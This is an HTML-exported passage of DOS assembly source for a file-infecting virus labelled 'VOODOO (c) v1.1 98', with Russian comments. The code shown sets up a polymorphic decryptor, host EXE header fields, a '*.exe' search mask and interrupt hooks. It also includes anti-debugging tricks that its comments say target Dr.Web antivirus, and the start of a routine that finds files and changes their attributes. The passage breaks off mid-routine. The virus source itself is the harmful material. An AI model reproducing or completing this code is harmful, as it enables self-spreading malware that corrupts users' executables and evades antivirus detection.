<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">Code</span><span class="sc0">  </span><span class="sc9">segment</span><span class="sc0">
      </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
       </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">ADD_C</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">104h</span><span class="sc0">    </span><span class="sc1">; для адресации переменных</span><span class="sc0">
</span><span class="sc5">MorphSize</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">   </span><span class="sc1">; Величина случайного смещения в декрипторе</span><span class="sc0">
</span><span class="sc5">BEGIN_BADY</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">BEGIN</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">    </span><span class="sc1">;  для адресации переменных</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">NEXTPOP</span><span class="sc0">
</span><span class="sc5">NEXTPOP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0fch</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">START_</span><span class="sc0">
</span><span class="sc5">TAG_COM_OR_EXE</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;IF TAG_COM_OR_EXE=1 then COM else EXE</span><span class="sc0">
</span><span class="sc5">ptrs</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hade_exe</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; dw 0           ;signature 1</span><span class="sc0">
</span><span class="sc5">partPag</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; dw 0           ;2</span><span class="sc0">
</span><span class="sc5">Pagecnt</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; dw 0           ;3</span><span class="sc0">
</span><span class="sc5">Relocnt</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">       </span><span class="sc1">; dw 0           ;4</span><span class="sc0">
</span><span class="sc5">HdrSize</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; dw 0           ;5</span><span class="sc0">
</span><span class="sc5">MinMem</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">      </span><span class="sc1">; dw 0           ;6</span><span class="sc0">
</span><span class="sc5">MaxMem</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">      </span><span class="sc1">; dw 0           ;7</span><span class="sc0">
</span><span class="sc5">ReloSS</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">      </span><span class="sc1">; dw 0           ;8</span><span class="sc0">
</span><span class="sc5">ExeSP</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">      </span><span class="sc1">; dw 0           ;9</span><span class="sc0">
</span><span class="sc5">ChkSum</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">      </span><span class="sc1">; dw 0           ;10</span><span class="sc0">
</span><span class="sc5">ExeIP</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">      </span><span class="sc1">; dw 0           ;11</span><span class="sc0">
</span><span class="sc5">ReloCS</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">22</span><span class="sc0">      </span><span class="sc1">; dw 0           ;12</span><span class="sc0">
</span><span class="sc5">OldDTA</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">      </span><span class="sc1">; size 4b</span><span class="sc0">
</span><span class="sc5">CurDTA</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0">      </span><span class="sc1">; size 128b</span><span class="sc0">
</span><span class="sc5">Count_F</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0">      </span><span class="sc1">; Число файлов в текучке за один проход</span><span class="sc0">
</span><span class="sc5">FileNs</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">156</span><span class="sc0">     </span><span class="sc1">; size FileCount*16 b   Таблица имен файлов</span><span class="sc0">
</span><span class="sc5">Find_files</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">156</span><span class="sc4">+</span><span class="sc5">Count_F</span><span class="sc4">*</span><span class="sc2">16</span><span class="sc0">    </span><span class="sc1">; size 2</span><span class="sc0">
</span><span class="sc5">HANDLER</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">156</span><span class="sc4">+</span><span class="sc5">Count_F</span><span class="sc4">*</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; size 2</span><span class="sc0">
</span><span class="sc5">filesize</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">HANDLER</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; size 4</span><span class="sc0">
</span><span class="sc5">Dwr</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; size 4</span><span class="sc0">
</span><span class="sc5">fpos</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">Dwr</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">; size 4</span><span class="sc0">
</span><span class="sc5">oldIP_</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">Fpos</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; size 2</span><span class="sc0">
</span><span class="sc5">oldCS_</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">oldIP_</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">; size 2</span><span class="sc0">
</span><span class="sc5">Hosesize</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">oldCS_</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">; size 2</span><span class="sc0">
</span><span class="sc5">STUFF_SIZE</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">Hosesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; size 2</span><span class="sc0">
</span><span class="sc5">R</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">STUFF_SIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; SIZE 2</span><span class="sc0">
</span><span class="sc5">typeFile</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">R</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">              </span><span class="sc1">; size 1</span><span class="sc0">
</span><span class="sc5">CALL_COM</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">typeFile</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; size 3</span><span class="sc0">
</span><span class="sc5">old_BX</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">CALL_COM</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; size 2</span><span class="sc0">
</span><span class="sc5">New_Bady</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc5">old_BX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; array</span><span class="sc0">
</span><span class="sc5">ResPart</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc2">5000</span><span class="sc0">
</span><span class="sc5">addres21hTR</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">7000</span><span class="sc0">
</span><span class="sc5">addres24hTR</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">addres21hTR</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">CurDirRoot</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc5">addres24hTR</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">path</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RANDOM_SIZE</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0FFH</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VOODOO (c) v1.1 98'</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Тело декриптора</span><span class="sc0">
</span><span class="sc5">STUFF</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">ptrs</span><span class="sc0">
</span><span class="sc5">s01</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc5">ptrs</span><span class="sc0">
</span><span class="sc5">s02</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc5">ptrs</span><span class="sc0">
</span><span class="sc5">s03</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc5">ptrs</span><span class="sc0">
</span><span class="sc5">s04</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0fffeh</span><span class="sc0">
        </span><span class="sc5">ptrs</span><span class="sc0">
</span><span class="sc5">s05</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc5">ptrs</span><span class="sc0">
</span><span class="sc5">s1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                 </span><span class="sc1">; size 1</span><span class="sc0">
        </span><span class="sc5">ptrs</span><span class="sc0">
</span><span class="sc5">s2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc0">              </span><span class="sc1">; size 3</span><span class="sc0">
        </span><span class="sc5">ptrs</span><span class="sc0">
</span><span class="sc5">s3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; size 2</span><span class="sc0">
        </span><span class="sc5">ptrs</span><span class="sc0">
</span><span class="sc5">s4</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">07</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; size 3 антиВеб одно время работал</span><span class="sc0">
        </span><span class="sc5">ptrs</span><span class="sc0">                    </span><span class="sc1">; но уже на ДВеб 4.3 не действует</span><span class="sc0">
                                </span><span class="sc1">; хотя бывает и накалывается</span><span class="sc0">
</span><span class="sc5">s5</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">07</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; size 4</span><span class="sc0">
        </span><span class="sc5">ptrs</span><span class="sc0">
</span><span class="sc5">s6</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">doprog</span><span class="sc0">               </span><span class="sc1">; size 2</span><span class="sc0">
       </span><span class="sc5">ptrs</span><span class="sc0">
</span><span class="sc5">tryagany</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">             </span><span class="sc1">; size 2  антиВеб</span><span class="sc0">
          </span><span class="sc5">ptrs</span><span class="sc0">
    </span><span class="sc5">s7</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; size 2</span><span class="sc0">
          </span><span class="sc5">ptrs</span><span class="sc0">
  </span><span class="sc5">s8</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">             </span><span class="sc1">; size 2  антиВеб</span><span class="sc0">
          </span><span class="sc5">ptrs</span><span class="sc0">
  </span><span class="sc5">s9</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">             </span><span class="sc1">; size 2</span><span class="sc0">
          </span><span class="sc5">ptrs</span><span class="sc0">
  </span><span class="sc5">s10</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">tryagany</span><span class="sc0">          </span><span class="sc1">; size 2</span><span class="sc0">
          </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">fuckDrweb</span><span class="sc0">         </span><span class="sc1">; size 2</span><span class="sc0">
          </span><span class="sc5">ptrs</span><span class="sc0">
</span><span class="sc5">doprog</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                </span><span class="sc1">; size 1</span><span class="sc0">
          </span><span class="sc5">ptrs</span><span class="sc0">
</span><span class="sc1">;-------------------</span><span class="sc0">
</span><span class="sc5">randomaze</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
   </span><span class="sc1">;mov ax,word ptr es:[46ch]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">46ch</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">; --------------------</span><span class="sc0">
</span><span class="sc5">RandSeed</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">ww</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">8405h</span><span class="sc0">
</span><span class="sc1">; Random  генерит число в заданном диапазоне</span><span class="sc0">
</span><span class="sc5">random</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ww</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0001</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">0002</span><span class="sc0">

</span><span class="sc5">RAND</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
</span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">RANDOM</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">fuckDrweb</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------</span><span class="sc0">
</span><span class="sc1">;________Procedure find files_________________________</span><span class="sc0">
</span><span class="sc5">INCREM</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">SET_ART_SPESH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
               </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
               </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
               </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
               </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
               </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">find</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;--- Get DTA ----</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">oldDTA</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Save DTA</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">oldDTA</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;--- Set DTA ----</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">CurDTA</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_DTA</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc1">;--------------</span><span class="sc0">
</span><span class="sc1">;--Fnd1st------</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">path</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">add_c</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
